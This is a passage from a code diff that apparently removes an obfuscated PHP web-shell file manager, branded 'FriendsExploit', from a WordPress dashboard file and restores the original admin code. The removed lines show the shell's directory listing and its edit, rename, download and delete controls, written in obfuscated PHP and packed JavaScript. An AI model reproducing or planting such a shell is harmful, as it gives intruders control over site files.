-				<tr>
-					<th>Name</th>
-					<th>Size</th>
-					<th>Permission</th>
-					<th>Action</th>
-				</tr>
-			</thead>
-			<tbody class="text-light">
-				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
-			</tbody>
-		</table>
-		<?php  mR: ?>
-	</article>
-	<div class="bg-dark border text-center mt-2">
-		<small>Copyright &copy; 2026 - Powered By FriendsExploit</small>
-	</div>
-	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
-	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
-	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
-</body>
-</html>
+<?php endif; ?>
+
+	<div id="dashboard-widgets-wrap">
+	<?php wp_dashboard(); ?>
+	</div><!-- dashboard-widgets-wrap -->
+
+</div><!-- wrap -->
+
+<?php
+wp_print_community_events_templates();
+
+require_once ABSPATH . 'wp-admin/admin-footer.php';
+ 
